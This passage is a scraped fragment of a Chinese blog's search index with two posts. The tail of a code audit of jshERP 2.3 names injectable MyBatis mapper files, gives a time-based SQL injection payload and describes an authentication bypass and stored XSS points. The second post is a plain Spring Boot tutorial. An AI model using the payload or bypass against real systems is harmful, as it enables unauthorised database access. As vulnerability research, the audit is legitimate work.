/account/list?search={\u0026quot;name\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;serialNo\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;remark\u0026quot;:\u0026quot;3\u0026quot;}\u0026amp;currentPage=1\u0026amp;pageSize=15 HTTP/1.1，name、serialNo、remark 都是对应的 AccoutMapperEx 的参数，那么就在 name 参数注入。\n同样的漏洞有：\nAccoutMapperEx.xml DepotMapperEx.xml LogMapperEx.xml （功能点在“系统管理”-“日志管理”） payload : 111\u0026rsquo; OR SLEEP(5) OR \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1 MaterialMapperEx.xml\t（功能点在“商品管理”-“商品信息”） PersonMapperEx.xml\t（功能点在“基本资料”-“经手人管理”） RoleMapperEx.xml\t（功能点在“系统管理”-“角色管理”） UnitMapperEx.xml\t（功能点在“商品管理”-“计量单位”） UserMapperEx.xml\t（功能点在“系统管理”-“用户管理”） 4、身份验证\u0026amp;鉴权 这一部分依旧是 LogCostFilter.java 发现的漏洞点，在SQL 注入中，我们登录到后台进行的注入，那么结合鉴权漏洞，就可以未登录进行SQL注入。\n从图片看到，绕过身份验证也可以进行SQL注入\n漏洞复现： 1、存储型XSS 很多功能点都存在此漏洞，以下举三例：\n1.1 用户管理 先新增一个用户\n修改用户名\n出现弹窗\n找到源码：\n接收前端传入的 info 参数，检查用户数量是否超限，并没有做任何特殊字符过滤，这里就是XSS 的入口点\n1.2 商品信息 增加商品：\n五个地方都会弹窗\n1.3 收入单 参考文章： 通过dnslog探测fastjson的几种方法（java.net.Inet4Address、Inet6Address、InetSocketAddress，url）\nhttps://blog.csdn.net/Adminxe/article/details/105918000\nCVE-2020-26945 mybatis二级缓存反序列化的分析与复现\nhttps://www.freebuf.com/vuls/251862.html\nMyBatis远程代码执行漏洞CVE-2020-26945\nhttps://www.freebuf.com/articles/web/252542.html\nJava 代码审计之华夏 ERP CMS v2.3\nhttps://www.freebuf.com/articles/web/347135.html\n【Java代码审计】华夏-ERPv2.3\nhttps://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html\n","permalink":"http://localhost:1313/xvsf/posts/jsherp-2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","summary":"\u003cp\u003e项目地址：\u003ca href=\"https://github.com/jishenghua/jshERP/releases/tag/2.3\"\u003ehttps://github.com/jishenghua/jshERP/releases/tag/2.3\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"环境搭建\"\u003e环境搭建：\u003c/h1\u003e\n\u003cp\u003eMySQL 5.7.26，IDEA，Maven 3.9.1，JDK 1.8，\u003c/p\u003e\n\u003cp\u003e数据库新建jsh_erp数据库，导入sql文件\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003cimg decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347937.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348745.png\" style=\"max-width: 100%; height: auto;\"\u003eIDEA 的 JDK 版本切换为1.8\u003c/p\u003e","title":"华夏ERP 2.3 代码审计"},{"content":"1、SpringBoot 简介 1.1 什么是 SpringBoot 随着 Spring 不断的发展，涉及的领域越来越多，项目整合开发需要配合各种各样的文件，慢慢变得不那么易用简单，违背了最初的理念，甚至人称配置地狱。Spring Boot 正是在这样的一个背景下被抽象出来的开发框架，目的为了让大家更容易的使用 Spring 、更容易的集成各种常用的中间件、开源软件；\nSpring Boot 基于 Spring 开发，Spirng Boot 本身并不提供 Spring 框架的核心特性以及扩展功能，只是用于快速、敏捷地开发新一代基于 Spring 框架的应用程序。也就是说，它并不是用来替代 Spring 的解决方案，而是和 Spring 框架紧密结合用于提升 Spring 开发者体验的工具。Spring Boot 以约定大于配置的核心思想，默认帮我们进行了很多设置，多数 Spring Boot 应用只需要很少的 Spring 配置。同时它集成了大量常用的第三方库配置（例如 Redis、MongoDB、Jpa、RabbitMQ、Quartz 等等），Spring Boot 应用中这些第三方库几乎可以零配置的开箱即用。\n简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架 。\nSpring Boot的主要优点：\n为所有Spring开发者更快的入门 开箱即用，提供各种默认配置来简化项目配置 内嵌式容器简化Web项目 没有冗余代码生成和XML配置的要求 1.2 单体应用架构 所谓单体应用架构（all in one）是指，我们将一个应用的中的所有应用服务都封装在一个应用中。\n无论是ERP、CRM或是其他什么系统，你都把数据库访问，Web访问，等等各个功能放到一个war包内。\n这样做的好处是，易于开发和测试；也十分方便部署；当需要扩展时，只需要将war复制多份，然后放到多个服务器上，再做个负载均衡就可以。\n单体应用架构的缺点是，哪怕我要修改一个非常小的地方，我都需要停掉整个服务，重新打包、部署这个应用war包。特别是对于一个大型应用，我们不可能把所有内容都放在一个应用里面，我们如何维护、如何分工合作都是问题。\n1.3 微服务架构 微服务是什么？ - 阮一峰的网络日志\nall in one 的架构方式，我们把所有的功能单元放在一个应用里面。然后我们把整个应用部署到服务器上。如果负载能力不行，我们将整个应用进行水平复制，进行扩展，然后在负载均衡。\n所谓微服务架构，就是打破之前 all in one 的架构方式，把每个功能元素独立出来。把独立出来的功能元素的动态组合，需要的功能元素才去拿来组合，需要多一些时可以整合多个功能元素。所以微服务架构是对功能元素进行复制，而没有对整个应用进行复制。\n这样做的好处是：\n节省了调用资源。 每个功能元素的服务都是一个可替换的、可独立升级的软件代码。 1.4 Hello，World - 第一个 SpringBoot 程序 官网提供的创建网站：https://start.spring.io/\n下载解压之后：\n正常情况下，idea 创建新项目即可\n创建一个接口测试：\nmaven 打包：\n注意：配置文件中的 \u0026lt;skip\u0026gt;true\u0026lt;/skip\u0026gt; ，是让 spring-boot-maven-plugin 跳过执行 的，所以 Maven 打包时不会生成可运行 JAR，自然就没有Main-Class，运行时就报 “没有主清单属性”。\n修改之后可以正常运行：\njava -jar helloworld-0.0.1-SNAPSHOT.jar\n2、原理 2.1 自动配置 2.1.1 pom.xml 父依赖 xml\r1 2 3 4 5 6 7 \u0026lt;!-- 父依赖 --\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.6.13\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;!-- 从远程仓库查找 --\u0026gt; \u0026lt;/parent\u0026gt; 点进去，发现还有一个父依赖\nxml\r1 2 3 4 5 \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.6.13\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; 这里才是真正管理SpringBoot应用里面所有依赖版本的地方，SpringBoot的版本控制中心；\n以后我们导入依赖默认是不需要写版本；但是如果导入的包没有在依赖中管理着就需要手动配置版本了；\n启动器 spring-boot-starter xml\r1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;dependencies\u0026gt; \u0026lt;!--启动器--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; springboot-boot-starter-xxx：就是spring-boot的场景启动器\nspring-boot-starter-web：帮我们导入了web模块正常运行所依赖的组件；\nSpringBoot将所有的功能场景都抽取出来，做成一个个的starter （启动器），只需要在项目中引入这些starter即可，所有相关的依赖都会导入进来 ， 我们要用什么功能就导入什么样的场景启动器即可 ；我们未来也可以自己自定义 starter；\n2.1.1 主启动类 默认的主启动类 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.kuang; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; //@SpringBootApplication 来标注一个主程序类 //说明这是一个Spring Boot应用 @SpringBootApplication public class Springboot01HelloworldApplication { public static void main(String[] args) { //将 springboot 应用启动 SpringApplication.run(Springboot01HelloworldApplication.class, args); } } 分析注解： @SpringBootApplication\n作用：标注在某个类上说明这个类是SpringBoot的主配置类 ， SpringBoot就应该运行这个类的main方法来启动SpringBoot应用；\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 //前四个都属于元注解 //指定这个注解可以标注的 Java 元素类型，ElementType.TYPE 表示只能标注在类、接口、枚举或注解类型上 @Target({ElementType.TYPE}) //指定注解生命周期，RUNTIME 表示注解会 保留到运行时，可以通过 反射 获取 @Retention(RetentionPolicy.RUNTIME) //表示注解会包含在 Javadoc 文档中 @Documented //如果一个类加了这个注解，它的子类也会自动继承该注解 @Inherited //springboot 的配置，标记当前类是 Spring Boot 配置类，本质上是 @Configuration 的一个特化 @SpringBootConfiguration //启用自动配置 @EnableAutoConfiguration //启动组件扫描，会扫描当前类所在包及子包的 Spring Bean,excludeFilters：排除某些类不被扫描。 @ComponentScan( excludeFilters = {@Filter( type = FilterType.CUSTOM, classes = {TypeExcludeFilter.class} ), @Filter( type = FilterType.CUSTOM, classes = {AutoConfigurationExcludeFilter.class} )} ) java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented //Spring 注解 //表示当前类是一个 Spring 配置类 @Configuration //Spring 在编译时会生成索引文件，用于快速扫描注解类，提高启动性能 @Indexed public @interface SpringBootConfiguration { @AliasFor( annotation = Configuration.class ) boolean proxyBeanMethods() default true; } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited //自动配置包 @AutoConfigurationPackage //给容器导入组件 @Import({AutoConfigurationImportSelector.class}) public @interface EnableAutoConfiguration { String ENABLED_OVERRIDE_PROPERTY = \u0026#34;spring.boot.enableautoconfiguration\u0026#34;; Class\u0026lt;?\u0026gt;[] exclude() default {}; String[] excludeName() default {}; } java\r1 2 3 4 5 6 7 8 9 10 11 @Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited //Spring底层注解@import ， 给容器中导入一个组件，Registrar.class 作用：将主启动类的所在包及包下面所有子包里面的所有组件扫描到Spring容器 ； @Import({AutoConfigurationPackages.Registrar.class}) public @interface AutoConfigurationPackage { String[] basePackages() default {}; Class\u0026lt;?\u0026gt;[] basePackageClasses() default {}; } 跟进 @Import({AutoConfigurationImportSelector.class})\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 @Import({AutoConfigurationImportSelector.class}) -\u0026gt;AutoConfigurationImportSelector public class AutoConfigurationImportSelector implements DeferredImportSelector, BeanClassLoaderAware, ResourceLoaderAware, BeanFactoryAware, EnvironmentAware, Ordered { ... //获取所有候选的自动配置类;AnnotationMetadata metadata：标注了 @EnableAutoConfiguration 或 @SpringBootApplication 的类的注解信息;AnnotationAttributes attributes：注解的属性集合，比如 exclude、excludeName 等 protected List\u0026lt;String\u0026gt; getCandidateConfigurations(AnnotationMetadata metadata, AnnotationAttributes attributes) { //通过 SpringFactoriesLoader 从 META-INF/spring.factories 文件中加载自动配置类名 List\u0026lt;String\u0026gt; configurations = SpringFactoriesLoader.loadFactoryNames(this.getSpringFactoriesLoaderFactoryClass(), this.getBeanClassLoader()); //configurations 不为空，如果为空，抛出异常提示 Assert.notEmpty(configurations, \u0026#34;No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.\u0026#34;); //返回启动自动导入配置文件的注解类；EnableAutoConfiguration return configurations; } -\u0026gt;SpringFactoriesLoader.loadFactoryNames public final class SpringFactoriesLoader { public static List\u0026lt;String\u0026gt; loadFactoryNames(Class\u0026lt;?\u0026gt; factoryType, @Nullable ClassLoader classLoader) { ClassLoader classLoaderToUse = classLoader; if (classLoader == null) { classLoaderToUse = SpringFactoriesLoader.class.getClassLoader(); } String factoryTypeName = factoryType.getName(); //调用了 loadSpringFactories 方法 return (List)loadSpringFactories(classLoaderToUse).getOrDefault(factoryTypeName, Collections.emptyList()); } -\u0026gt;loadSpringFactories private static Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; loadSpringFactories(ClassLoader classLoader) { //cache 是静态缓存，避免每次都扫描文件。如果缓存存在，直接返回，提升性能 Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; result = (Map)cache.get(classLoader); if (result != null) { return result; } else { result = new HashMap(); try { //扫描 META-INF/spring.factories Enumeration\u0026lt;URL\u0026gt; urls = classLoader.getResources(\u0026#34;META-INF/spring.factories\u0026#34;); //将每个 spring.factories 文件包装成 UrlResource。使用 PropertiesLoaderUtils 加载为 Properties 对象，key=value 的形式 while(urls.hasMoreElements()) { URL url = (URL)urls.nextElement(); UrlResource resource = new UrlResource(url); Properties properties = PropertiesLoaderUtils.loadProperties(resource); //遍历文件中的每个条目,把实现类加入列表 for(Map.Entry\u0026lt;?, ?\u0026gt; entry : properties.entrySet()) { String factoryTypeName = ((String)entry.getKey()).trim(); String[] factoryImplementationNames = StringUtils.commaDelimitedListToStringArray((String)entry.getValue()); for(String factoryImplementationName : factoryImplementationNames) { ((List)result.computeIfAbsent(factoryTypeName, (key) -\u0026gt; new ArrayList())).add(factoryImplementationName.trim()); } } } //去重 distinct(),转为 不可修改列表（unmodifiableList） result.replaceAll((factoryType, implementations) -\u0026gt; (List)implementations.stream().distinct().collect(Collectors.collectingAndThen(Collectors.toList(), Collections::unmodifiableList))); //缓存结果并返回 cache.put(classLoader, result); return result; } catch (IOException ex) { //读取文件出错时，抛出 IllegalArgumentException 异常 throw new IllegalArgumentException(\u0026#34;Unable to load factories from location [META-INF/spring.factories]\u0026#34;, ex); } } } -\u0026gt;spring.factories （既然是对此文件做改动，那么全局搜索此文件） 查看后发现都是自动配置文件，这就是自动配置的根源\n小结： SpringBoot在启动的时候从类路径下的 META-INF/spring.factories（spring-boot-autoconfigure-2.6.13.jar!\\META-INF\\spring.factories）中获取 EnableAutoConfiguration 指定的自动配置值\nSpringApplication 这个类主要做了以下四件事情：\n1、推断应用的类型是普通的项目还是Web项目\n2、查找并加载所有可用初始化器 ， 设置到initializers属性中\n3、找出所有的应用程序监听器，设置到listeners属性中\n4、推断并设置main方法的定义类，找到运行的主类\njava\r1 SpringApplication.run(Springboot01HelloworldApplication.class, args); 3、SpringBoot 配置 SpringBoot使用一个全局的配置文件 ， 配置文件名称是固定的\napplication.properties 语法结构 ：key=value application.yml 语法结构 ：key：空格 value 配置文件的作用 ：修改SpringBoot自动配置的默认值，因为SpringBoot在底层都给我们自动配置好了；\nyaml概述 YAML 语言教程 - 阮一峰的网络日志\nyaml 语法 yaml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 普通的 key-value name: qwe # 对象 student: name: qwe age: 11 student: {name: qwe, age: 1} # 数组 pets: - cat - dog - pig pets: [cat,dog,pig] yaml注入配置文件 **@ConfigurationProperties **作用：将配置文件中配置的每一个属性的值，映射到这个组件中；告诉 SpringBoot 将本类中的所有属性和配置文件中相关的配置进行绑定参数 prefix = \u0026ldquo;person\u0026rdquo; : 将配置文件中的person下面的所有属性一一对应\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 package com.kuang.pojo; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.stereotype.Component; import java.util.*; @Component @ConfigurationProperties(prefix = \u0026#34;person\u0026#34;) public class Person { private String name; private int age; private Boolean happy; private Date birth; private Map\u0026lt;String,Object\u0026gt; maps; private List\u0026lt;Object\u0026gt; lists; private Dog dog; public Person() {} public Person(String name, int age, Date birth, Boolean happy, List\u0026lt;Object\u0026gt; lists, Map\u0026lt;String, Object\u0026gt; maps, Dog dog) { this.name = name; this.age = age; this.birth = birth; this.happy = happy; this.lists = lists; this.maps = maps; this.dog = dog; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public Boolean getHappy() { return happy; } public void setHappy(Boolean happy) { this.happy = happy; } public Date getBirth() { return birth; } public void setBirth(Date birth) { this.birth = birth; } public Map\u0026lt;String, Object\u0026gt; getMaps() { return maps; } public void setMaps(Map\u0026lt;String, Object\u0026gt; maps) { this.maps = maps; } public List\u0026lt;Object\u0026gt; getLists() { return lists; } public void setLists(List\u0026lt;Object\u0026gt; lists) { this.lists = lists; } public Dog getDog() { return dog; } public void setDog(Dog dog) { this.dog = dog; } @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#34;, happy=\u0026#34; + happy + \u0026#34;, birth=\u0026#34; + birth + \u0026#34;, maps=\u0026#34; + maps + \u0026#34;, lists=\u0026#34; + lists + \u0026#34;, dog=\u0026#34; + dog + \u0026#39;}\u0026#39;; } } yaml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 server: port: 8123 person: name: qwe age: 1 happy: false birth: \u0026#34;1009/09/08\u0026#34; maps: k1: v1 k2: v2 lists: - code - music dog: name: wang age: 1 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package com.kuang; import com.kuang.pojo.Person; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest class Springboot01HelloworldApplicationTests { @Autowired private Person person; @Test void contextLoads() { System.out.println(person); } } Person{name=\u0026lsquo;qwe\u0026rsquo;, age=1, happy=false, birth=Thu Sep 08 00:00:00 CST 1009, maps={k1=v1, k2=v2}, lists=[code, music], dog=Dog{name=\u0026lsquo;wang\u0026rsquo;, age=1}}\n加载指定的配置文件 @PropertySource ：加载指定的配置文件；\n@configurationProperties：默认从全局配置文件中获取值；\nproperties\r1 name=qaz java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 //指定加载 person.properties文件 @PropertySource(value = \u0026#34;classpath:person.properties\u0026#34;) @Component //@ConfigurationProperties(prefix = \u0026#34;person\u0026#34;) public class Person { @Value(\u0026#34;${name}\u0026#34;) private String name; private int age; private Boolean happy; private Date birth; private Map\u0026lt;String,Object\u0026gt; maps; private List\u0026lt;Object\u0026gt; lists; private Dog dog; 配置文件占位符 yaml\r1 2 3 4 5 6 7 8 9 10 11 12 person: name: qwe${random.uuid} # 随机uuid age: ${random.int} # 随机int happy: false birth: 2000/01/01 maps: {k1: v1,k2: v2} lists: - code - music dog: name: ${person.hello:other}_旺财 age: 1 小结： JSR303数据校验 ， 可以在字段是增加一层过滤器验证 ， 可以保证数据的合法性\n松散绑定：yml 中写的 last-name 和 lastName是一样的\n复杂类型封装，yml中可以封装对象 ， 使用value就不支持\nJSR303数据校验 字段是增加一层过滤器验证 ， 可以保证数据的合法性\n常见参数：\nyaml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @NotNull(message=\u0026#34;名字不能为空\u0026#34;) private String userName; @Max(value=120,message=\u0026#34;年龄最大不能查过120\u0026#34;) private int age; @Email(message=\u0026#34;邮箱格式错误\u0026#34;) private String email; #空检查 @Null #验证对象是否为null @NotNull #验证对象是否不为null, 无法查检长度为0的字符串 @NotBlank #检查约束字符串是不是Null还有被Trim的长度是否大于0,只对字符串,且会去掉前后空格. @NotEmpty #检查约束元素是否为NULL或者是EMPTY. #Booelan检查 @AssertTrue #验证 Boolean 对象是否为 true @AssertFalse #验证 Boolean 对象是否为 false #长度检查 @Size(min=, max=) #验证对象（Array,Collection,Map,String）长度是否在给定的范围之内 @Length(min=, max=) string is between min and max included. #日期检查 @Past #验证 Date 和 Calendar 对象是否在当前时间之前 @Future #验证 Date 和 Calendar 对象是否在当前时间之后 @Pattern #验证 String 对象是否符合正则表达式的规则 多环境切换 profile是Spring对不同环境提供不同配置功能的支持，可以通过激活不同的环境版本，实现快速切换环境；\n多配置文件 我们在主配置文件编写的时候，文件名可以是 application-{profile}.properties/yml , 用来指定多个环境版本；\n例如：\napplication-test.properties 代表测试环境配置\napplication-dev.properties 代表开发环境配置\n但是Springboot并不会直接启动这些配置文件，它默认使用application.properties主配置文件；\nyaml的多文档块 和properties配置文件中一样，但是使用yml去实现不需要创建多个配置文件\nyaml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 server: port: 8081 #选择要激活那个环境块 spring: profiles: active: prod --- server: port: 8083 spring: profiles: dev #配置环境的名称 --- server: port: 8084 spring: profiles: prod #配置环境的名称 注意：如果yml和properties同时都配置了端口，并且没有激活其他环境 ， 默认会使用properties配置文件的！\n配置文件加载位置 外部加载配置文件的方式十分多，我们选择最常用的即可，在开发的资源文件中进行配置！\nspringboot 启动会扫描以下位置的application.properties或者application.yml文件作为Spring boot的默认配置文件：\n优先级1：项目路径下的config文件夹配置文件\n优先级2：项目路径下配置文件\n优先级3：资源路径下的config文件夹配置文件\n优先级4：资源路径下配置文件\n优先级由高到底，高优先级的配置会覆盖低优先级的配置；\n自动配置原理 来到 META-INF/spring.factories\n以其中的 HttpEncodingAutoConfiguration 为例分析\nspring.http. 在高版本已经弃用\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 //声明这是 spring 配置类 @Configuration(proxyBeanMethods = false) //启用对 ServerProperties 的配置属性绑定，Spring Boot 会把配置文件中 server.* 的属性绑定到 ServerProperties 对象中 @EnableConfigurationProperties(ServerProperties.class) //条件注解，表示此配置类 仅在 Web 应用且使用 Servlet 类型时生效 @ConditionalOnWebApplication(type = ConditionalOnWebApplication.Type.SERVLET) //表示只有类路径中存在 CharacterEncodingFilter(Spring 提供的过滤器，用于设置请求和响应的字符编码) 时，这个配置才会生效。 @ConditionalOnClass(CharacterEncodingFilter.class) //条件注解，用于检查 配置文件中某个属性 @ConditionalOnProperty(prefix = \u0026#34;server.servlet.encoding\u0026#34;, value = \u0026#34;enabled\u0026#34;, matchIfMissing = true) //从 ServerProperties 中提取编码配置 public class HttpEncodingAutoConfiguration { private final Encoding properties; public HttpEncodingAutoConfiguration(ServerProperties properties) { this.properties = properties.getServlet().getEncoding(); } //声明一个 Spring Bean，返回类型为 CharacterEncodingFilter @Bean @ConditionalOnMissingBean public CharacterEncodingFilter characterEncodingFilter() { CharacterEncodingFilter filter = new OrderedCharacterEncodingFilter(); filter.setEncoding(this.properties.getCharset().name()); filter.setForceRequestEncoding(this.properties.shouldForce(Encoding.Type.REQUEST)); filter.setForceResponseEncoding(this.properties.shouldForce(Encoding.Type.RESPONSE)); return filter; } 跟进 ServerProperties.class\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @ConfigurationProperties(prefix = \u0026#34;server\u0026#34;, ignoreUnknownFields = true) public class ServerProperties { /** * Server HTTP port. */ private Integer port; /** * Network address to which the server should bind. */ private InetAddress address; @NestedConfigurationProperty private final ErrorProperties error = new ErrorProperties(); /** * Strategy for handling X-Forwarded-* headers. */ private ForwardHeadersStrategy forwardHeadersStrategy; ... 那么 yaml 中可以写的配置即为\n小结： xxxxAutoConfigurartion：自动配置类\nxxxxProperties： 配置属性类 \u0026ndash; debug: true 查看生效的自动配置类\n4、SpringBoot Web 开发 4.1 静态资源 4.1.1 静态资源映射规则 WebMvcAutoConfiguration -\u0026gt; EnableWebMvcConfiguration -\u0026gt; addResourceHandlers\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 @Override public void addResourceHandlers(ResourceHandlerRegistry registry) { //resourceProperties.isAddMappings() 读取静态资源配置 if (!this.resourceProperties.isAddMappings()) { logger.debug(\u0026#34;Default resource handling disabled\u0026#34;); return; } //WebJars 是一种把 JS、CSS 打包成 jar 的方式，这里让 /webjars/... 直接访问到 jar 包里的静态文件 addResourceHandler(registry, \u0026#34;/webjars/**\u0026#34;, \u0026#34;classpath:/META-INF/resources/webjars/\u0026#34;); //映射普通静态资源 addResourceHandler(registry, this.mvcProperties.getStaticPathPattern(), (registration) -\u0026gt; { registration.addResourceLocations(this.resourceProperties.getStaticLocations()); if (this.servletContext != null) { ServletContextResource resource = new ServletContextResource(this.servletContext, SERVLET_LOCATION); registration.addResourceLocations(resource); } }); } //提供一个更简化的调用方式，只传 URL 模式和物理路径，不需要自己写 Consumer private void addResourceHandler(ResourceHandlerRegistry registry, String pattern, String... locations) { addResourceHandler(registry, pattern, (registration) -\u0026gt; registration.addResourceLocations(locations)); } private void addResourceHandler(ResourceHandlerRegistry registry, String pattern, Consumer\u0026lt;ResourceHandlerRegistration\u0026gt; customizer) { if (registry.hasMappingForPattern(pattern)) { return; } ResourceHandlerRegistration registration = registry.addResourceHandler(pattern); customizer.accept(registration); registration.setCachePeriod(getSeconds(this.resourceProperties.getCache().getPeriod())); registration.setCacheControl(this.resourceProperties.getCache().getCachecontrol().toHttpCacheControl()); registration.setUseLastModified(this.resourceProperties.getCache().isUseLastModified()); customizeResourceHandlerRegistration(registration); } Webjars本质就是以jar包的方式引入静态资源\nhttps://www.webjars.org/\nxml\r1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jquery\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.4.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 要使用jQuery，只要要引入jQuery对应版本的pom依赖即可\n另一种规则：/**\nWebProperties -\u0026gt; getStaticLocations -\u0026gt; staticLocations -\u0026gt; CLASSPATH_RESOURCE_LOCATIONS -\u0026gt; plain\r1 2 3 4 5 //以下四个目录存放的静态资源可以被识别 \u0026#34;classpath:/META-INF/resources/\u0026#34;, \u0026#34;classpath:/resources/\u0026#34;, \u0026#34;classpath:/static/\u0026#34;, \u0026#34;classpath:/public/\u0026#34; java\r1 2 3 4 5 6 7 8 public String[] getStaticLocations() { return this.staticLocations; } private String[] staticLocations = CLASSPATH_RESOURCE_LOCATIONS; private static final String[] CLASSPATH_RESOURCE_LOCATIONS = { \u0026#34;classpath:/META-INF/resources/\u0026#34;, \u0026#34;classpath:/resources/\u0026#34;, \u0026#34;classpath:/static/\u0026#34;, \u0026#34;classpath:/public/\u0026#34; }; 优先级：resources \u0026gt; static \u0026gt; public\n4.1.2 首页 静态资源文件夹下的所有 index.html 页面\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @Bean public WelcomePageHandlerMapping welcomePageHandlerMapping(ApplicationContext applicationContext, FormattingConversionService mvcConversionService, ResourceUrlProvider mvcResourceUrlProvider) { WelcomePageHandlerMapping welcomePageHandlerMapping = new WelcomePageHandlerMapping( //检测模板引擎（Thymeleaf、Freemarker 等）是否可用，以判断欢迎页是模板还是静态文件 new TemplateAvailabilityProviders(applicationContext), //查找模板、静态文件 applicationContext, //查找实际的欢迎页资源 getWelcomePage(), //欢迎页匹配路径模式 this.mvcProperties.getStaticPathPattern() ); //设置拦截器 welcomePageHandlerMapping.setInterceptors( getInterceptors(mvcConversionService, mvcResourceUrlProvider) ); //设置 CORS welcomePageHandlerMapping.setCorsConfigurations( getCorsConfigurations() ); return welcomePageHandlerMapping; } 跟进 getWelcomePage()\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 private Resource getWelcomePage() { //遍历静态资源位置 for (String location : this.resourceProperties.getStaticLocations()) { Resource indexHtml = getIndexHtml(location); if (indexHtml != null) { return indexHtml; } } //检查 ServletContext 下的欢迎页 ServletContext servletContext = getServletContext(); if (servletContext != null) { return getIndexHtml(new ServletContextResource(servletContext, SERVLET_LOCATION)); } return null; } 4.2 Thymeleaf模板引擎 https://www.thymeleaf.org/\nhttps://github.com/thymeleaf/thymeleaf\n引入依赖\nxml\r1 2 3 4 5 \u0026lt;!--thymeleaf--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-thymeleaf\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 